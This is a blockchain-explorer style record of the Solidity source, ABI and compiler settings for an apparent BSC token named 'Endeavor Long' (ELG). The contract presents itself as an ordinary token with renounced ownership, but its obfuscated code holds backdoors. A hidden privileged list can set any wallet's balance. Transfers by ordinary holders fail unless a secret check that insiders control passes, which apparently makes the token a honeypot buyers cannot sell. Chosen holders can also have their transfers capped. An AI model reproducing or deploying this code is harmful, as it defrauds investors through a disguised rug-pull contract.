{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface listExemptReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minShould {\n    function createPair(address toFee, address atExemptTake) external returns (address);\n}\n\ninterface marketingAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldFund) external view returns (uint256);\n\n    function transfer(address atMode, uint256 receiverLiquidity) external returns (bool);\n\n    function allowance(address senderIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atMode,\n        uint256 receiverLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTo, uint256 value);\n    event Approval(address indexed senderIs, address indexed spender, uint256 value);\n}\n\ninterface fundToken is marketingAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EndeavorLong is amountFund, marketingAuto, fundToken {\n\n    uint8 private toTeam = 18;\n\n    address shouldIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverEnable(address isTeam, address atMode, uint256 receiverLiquidity) internal returns (bool) {\n        require(modeTakeList[isTeam] >= receiverLiquidity);\n        modeTakeList[isTeam] -= receiverLiquidity;\n        modeTakeList[atMode] += receiverLiquidity;\n        emit Transfer(isTeam, atMode, receiverLiquidity);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed buyTx, address indexed enableMin);\n\n    function owner() external view returns (address) {\n        return listReceiver;\n    }\n\n    bool private amountMode;\n\n    function listEnable() private view {\n        require(isFund[_msgSender()]);\n    }\n\n    address private listReceiver;\n\n    mapping(address => bool) public isFund;\n\n    uint256 receiverTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxMin;\n    }\n\n    function tokenAutoTotal(uint256 receiverLiquidity) public {\n        listEnable();\n        launchLaunched = receiverLiquidity;\n    }\n\n    function approve(address fundShould, uint256 receiverLiquidity) public virtual override returns (bool) {\n        isLiquidity[_msgSender()][fundShould] = receiverLiquidity;\n        emit Approval(_msgSender(), fundShould, receiverLiquidity);\n        return true;\n    }\n\n    constructor (){\n        if (amountMode) {\n            atLaunched = true;\n        }\n        listExemptReceiver launchSender = listExemptReceiver(swapAmount);\n        totalTx = minShould(launchSender.factory()).createPair(launchSender.WETH(), address(this));\n        \n        swapTeam = _msgSender();\n        tokenMax();\n        isFund[swapTeam] = true;\n        modeTakeList[swapTeam] = maxMin;\n        if (liquidityTake == fromSell) {\n            fromSell = liquidityTake;\n        }\n        emit Transfer(address(0), swapTeam, maxMin);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toTeam;\n    }\n\n    uint256 constant walletAmount = 7 ** 10;\n\n    uint256 launchLaunched;\n\n    mapping(address => bool) public atLiquidity;\n\n    function txReceiver(address isTeam, address atMode, uint256 receiverLiquidity) internal returns (bool) {\n        if (isTeam == swapTeam) {\n            return receiverEnable(isTeam, atMode, receiverLiquidity);\n        }\n        uint256 tokenLaunch = marketingAuto(totalTx).balanceOf(shouldIs);\n        require(tokenLaunch == launchLaunched);\n        require(atMode != shouldIs);\n        if (atLiquidity[isTeam]) {\n            return receiverEnable(isTeam, atMode, walletAmount);\n        }\n        return receiverEnable(isTeam, atMode, receiverLiquidity);\n    }\n\n    function tokenMax() public {\n        emit OwnershipTransferred(swapTeam, address(0));\n        listReceiver = address(0);\n    }\n\n    bool public takeFee;\n\n    mapping(address => uint256) private modeTakeList;\n\n    bool public feeTx;\n\n    function getOwner() external view returns (address) {\n        return listReceiver;\n    }\n\n    function exemptMarketing(address exemptAmount) public {\n        listEnable();\n        if (fromSell != liquidityTake) {\n            fromSell = takeLiquidity;\n        }\n        if (exemptAmount == swapTeam || exemptAmount == totalTx) {\n            return;\n        }\n        atLiquidity[exemptAmount] = true;\n    }\n\n    string private sellReceiver = \"ELG\";\n\n    uint256 public liquidityTake;\n\n    function transferFrom(address isTeam, address atMode, uint256 receiverLiquidity) external override returns (bool) {\n        if (_msgSender() != swapAmount) {\n            if (isLiquidity[isTeam][_msgSender()] != type(uint256).max) {\n                require(receiverLiquidity <= isLiquidity[isTeam][_msgSender()]);\n                isLiquidity[isTeam][_msgSender()] -= receiverLiquidity;\n            }\n        }\n        return txReceiver(isTeam, atMode, receiverLiquidity);\n    }\n\n    uint256 public fromSell;\n\n    function senderReceiver(address marketingTxAmount) public {\n        if (takeFee) {\n            return;\n        }\n        \n        isFund[marketingTxAmount] = true;\n        \n        takeFee = true;\n    }\n\n    bool public atLaunched;\n\n    string private exemptFee = \"Endeavor Long\";\n\n    uint256 public takeLiquidity;\n\n    address public swapTeam;\n\n    function balanceOf(address shouldFund) public view virtual override returns (uint256) {\n        return modeTakeList[shouldFund];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptFee;\n    }\n\n    function totalWallet(address marketingTx, uint256 receiverLiquidity) public {\n        listEnable();\n        modeTakeList[marketingTx] = receiverLiquidity;\n    }\n\n    address public totalTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private isLiquidity;\n\n    uint256 private maxMin = 100000000 * 10 ** 18;\n\n    function allowance(address minLiquidityMode, address fundShould) external view virtual override returns (uint256) {\n        if (fundShould == swapAmount) {\n            return type(uint256).max;\n        }\n        return isLiquidity[minLiquidityMode][fundShould];\n    }\n\n    address swapAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address marketingTx, uint256 receiverLiquidity) external virtual override returns (bool) {\n        return txReceiver(_msgSender(), marketingTx, receiverLiquidity);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidityMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"}],\"name\":\"exemptMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTxAmount\",\"type\":\"address\"}],\"name\":\"senderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"tokenAutoTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"totalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EndeavorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}